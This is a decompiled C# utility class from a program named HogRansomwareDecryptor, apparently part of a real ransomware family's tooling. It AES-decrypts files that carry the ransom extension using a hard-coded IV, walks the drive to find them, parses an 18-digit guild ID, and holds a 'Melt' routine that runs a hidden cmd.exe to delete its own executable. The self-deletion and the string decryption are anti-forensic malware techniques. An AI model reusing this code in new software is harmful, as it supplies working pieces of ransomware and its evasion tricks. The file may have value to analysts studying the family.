using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace HogRansomwareDecryptor
{
	// Token: 0x02000006 RID: 6
	public static class Utils
	{
		// Token: 0x06000016 RID: 22 RVA: 0x00002D38 File Offset: 0x00000F38
		public static void DecryptFile(string path)
		{
			try
			{
				FileInfo fileInfo = new FileInfo(path);
				if (fileInfo.IsReadOnly)
				{
					fileInfo.IsReadOnly = false;
				}
				using (AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider())
				{
					aesCryptoServiceProvider.Key = Convert.FromBase64String(Settings.Key);
					aesCryptoServiceProvider.IV = new byte[]
					{
						120,
						7,
						95,
						52,
						29,
						172,
						50,
						144,
						112,
						17,
						172,
						160,
						236,
						37,
						79,
						166
					};
					using (FileStream fileStream = new FileStream(path, FileMode.Open))
					{
						using (FileStream fileStream2 = new FileStream(path.Remove(path.Length - Settings.Extension.Length), FileMode.Create))
						{
							using (CryptoStream cryptoStream = new CryptoStream(fileStream2, aesCryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Write))
							{
								fileStream.Write(aesCryptoServiceProvider.IV, 0, aesCryptoServiceProvider.IV.Length);
								fileStream.CopyTo(cryptoStream);
							}
						}
					}
				}
				File.Delete(path);
			}
			catch
			{
			}
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00002E58 File Offset: 0x00001058
		public static string Decrypt(string str)
		{
			try
			{
				using (AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider())
				{
					aesCryptoServiceProvider.Key = Convert.FromBase64String(Settings.StringEncryptionKey);
					aesCryptoServiceProvider.IV = new byte[]
					{
						120,
						7,
						95,
						52,
						29,
						172,
						50,
						144,
						112,
						17,
						172,
						160,
						236,
						37,
						79,
						166
					};
					byte[] array = Convert.FromBase64String(str);
					using (MemoryStream memoryStream = new MemoryStream())
					{
						using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aesCryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Write))
						{
							cryptoStream.Write(array, 0, array.Length);
							cryptoStream.Close();
						}
						str = Encoding.Unicode.GetString(memoryStream.ToArray());
					}
					return str;
				}
			}
			catch
			{
			}
			return str;
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00002F34 File Offset: 0x00001134
		public static IEnumerable<string> GetFiles(string path)
		{
			Queue<string> queue = new Queue<string>();
			queue.Enqueue(path);
			while (queue.Count > 0)
			{
				path = queue.Dequeue();
				try
				{
					if (!path.StartsWith("C:\\Windows"))
					{
						foreach (string item in Directory.GetDirectories(path))
						{
							queue.Enqueue(item);
						}
					}
				}
				catch
				{
				}
				string[] array = null;
				try
				{
					array = Directory.GetFiles(path);
				}
				catch
				{
				}
				if (array != null)
				{
					foreach (string text in array)
					{
						if (text.EndsWith(Settings.Extension))
						{
							yield return text;
						}
					}
					string[] array2 = null;
				}
			}
			yield break;
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00002F44 File Offset: 0x00001144
		public static string ParseGuildID(string str)
		{
			string result;
			try
			{
				result = (from Match m in Regex.Matches(str, "\\d{18}")
				select m.Value).ToArray<string>()[0].ToString();
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00002FAC File Offset: 0x000011AC
		public static void Melt()
		{
			ProcessStartInfo startInfo = null;
			try
			{
				startInfo = new ProcessStartInfo
				{
					Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + Process.GetCurrentProcess().MainModule.FileName + "\"",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					FileName = "cmd.exe"
				};
			}
			catch
			{
			}
			finally
			{
				Process.Start(startInfo);
				Environment.Exit(0);
			}
		}
	}
}
